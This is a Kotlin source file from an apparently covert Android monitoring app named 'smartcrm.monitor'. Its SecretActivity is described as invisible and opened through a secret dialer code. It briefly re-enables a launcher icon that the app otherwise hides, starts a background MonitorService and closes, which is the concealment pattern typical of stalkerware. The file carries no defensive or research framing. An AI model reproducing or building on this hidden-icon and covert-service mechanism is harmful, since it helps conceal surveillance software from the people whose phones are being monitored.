package com.smartcrm.monitor

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

/**
 * Invisible activity launched via dialer code.
 * Just starts the service and finishes.
 */
class SecretActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Re-enable icon (will be hidden again after MainActivity runs)
        try {
            val compName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                compName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {}

        // Ensure service is running
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean("icon_hidden", false).apply()

        finish()
    }
}
